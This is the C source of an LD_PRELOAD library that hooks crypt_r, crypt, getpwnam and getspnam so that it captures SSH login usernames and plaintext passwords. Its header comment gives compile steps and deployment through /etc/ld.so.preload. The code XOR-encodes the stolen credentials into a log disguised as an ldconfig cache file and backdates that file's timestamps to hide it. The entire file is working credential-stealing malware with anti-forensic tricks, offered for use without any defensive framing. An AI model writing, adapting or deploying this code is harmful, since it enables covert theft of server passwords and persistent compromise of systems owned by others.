/*
 * pam_hook.c - LD_PRELOAD hook to capture SSH credentials
 *
 * Works on OpenSSH 9.x where PAM conversation is scrubbed.
 * Hooks crypt_r() which receives the plaintext password.
 *
 * Compile:
 *   gcc -fPIC -shared -o pam_hook.so pam_hook.c -ldl
 *
 * Deploy:
 *   echo "/path/to/pam_hook.so" > /etc/ld.so.preload
 *   # OR
 *   LD_PRELOAD=/path/to/pam_hook.so /usr/sbin/sshd -D
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <time.h>
#include <sys/stat.h>
#include <utime.h>
#include <pwd.h>
#include <shadow.h>
#include <crypt.h>

#define LOG_PATH "/var/cache/ldconfig/aux-cache.log"
#define XOR_KEY "ld.so.cache"

static char *last_user = NULL;

static void log_creds(const char *user, const char *pass) {
    char buf[512];
    int len, i;
    FILE *f;
    struct utimbuf ut = {1672531200, 1672531200};

    if (!user || !pass || !*pass) return;

    mkdir("/var/cache/ldconfig", 0755);
    f = fopen(LOG_PATH, "a");
    if (!f) return;

    len = snprintf(buf, sizeof(buf), "%ld|%s|%s\n", (long)time(NULL), user, pass);
    for (i = 0; i < len; i++)
        buf[i] ^= XOR_KEY[i % (sizeof(XOR_KEY) - 1)];

    fwrite(buf, 1, len, f);
    fclose(f);
    utime(LOG_PATH, &ut);
}

/* Hook getpwnam to capture username */
struct passwd *getpwnam(const char *name) {
    static struct passwd *(*real_func)(const char *) = NULL;
    if (!real_func) real_func = dlsym(RTLD_NEXT, "getpwnam");

    if (name && *name) {
        if (last_user) free(last_user);
        last_user = strdup(name);
    }

    return real_func ? real_func(name) : NULL;
}

/* Hook getspnam to capture username */
struct spwd *getspnam(const char *name) {
    static struct spwd *(*real_func)(const char *) = NULL;
    if (!real_func) real_func = dlsym(RTLD_NEXT, "getspnam");

    if (name && *name) {
        if (last_user) free(last_user);
        last_user = strdup(name);
    }

    return real_func ? real_func(name) : NULL;
}

/* Hook crypt_r - where pam_unix verifies the password */
char *crypt_r(const char *phrase, const char *setting, struct crypt_data *data) {
    static char *(*real_func)(const char *, const char *, struct crypt_data *) = NULL;
    if (!real_func) real_func = dlsym(RTLD_NEXT, "crypt_r");

    /* Log credentials before verification */
    if (phrase && *phrase) {
        log_creds(last_user ? last_user : "unknown", phrase);
    }

    return real_func ? real_func(phrase, setting, data) : NULL;
}

/* Hook crypt for completeness */
char *crypt(const char *phrase, const char *setting) {
    static char *(*real_func)(const char *, const char *) = NULL;
    if (!real_func) real_func = dlsym(RTLD_NEXT, "crypt");

    if (phrase && *phrase) {
        log_creds(last_user ? last_user : "unknown", phrase);
    }

    return real_func ? real_func(phrase, setting) : NULL;
}
